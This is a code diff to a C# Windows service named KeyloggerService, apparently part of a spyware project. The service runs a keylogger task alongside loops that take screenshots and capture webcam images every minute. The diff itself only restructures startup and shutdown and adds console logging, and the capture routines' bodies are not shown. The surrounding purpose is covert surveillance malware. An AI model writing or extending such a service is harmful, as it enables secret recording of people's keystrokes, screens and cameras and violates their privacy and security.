@@ -17,8 +17,9 @@
             InitializeComponent();
         }
 
-        protected override async void OnStart(string[] args)
+        protected override void OnStart(string[] args)
         {
+            Console.WriteLine("Executing KeyloggerService OnStart");
             var startKeyloggerTask = Task.Factory.StartNew(() => StartKeylogger());
 
             var tasks = new List<Task>
@@ -29,8 +30,12 @@
             };
 
             Console.WriteLine("Starting services");
-            await Task.WhenAll(tasks);
-            Console.WriteLine("Stopping services");
+            Task.Run(async () => await Task.WhenAll(tasks)).Wait();
+        }
+
+        protected override void OnStop()
+        {
+            Console.WriteLine("OnStop : Stopping services");
         }
 
         public void StartKeylogger()
@@ -41,6 +46,8 @@
 
         public async Task StartScreenshotServiceAsync()
         {
+            Console.WriteLine("StartScreenshotServiceAsync");
+
             while (true)
             {
                 try
@@ -61,6 +68,8 @@
 
         public async Task StartWebCameraServiceAsync()
         {
+            Console.WriteLine("StartWebCameraServiceAsync");
+
             while (true)
             {
                 try
@@ -77,11 +86,6 @@
                     await Task.Delay(TimeSpan.FromMinutes(1));
                 }
             }
-        }
-
-        protected override void OnStop()
-        {
-            // TODO: Add code here to perform any tear-down necessary to stop your service.
         }
     }
 }
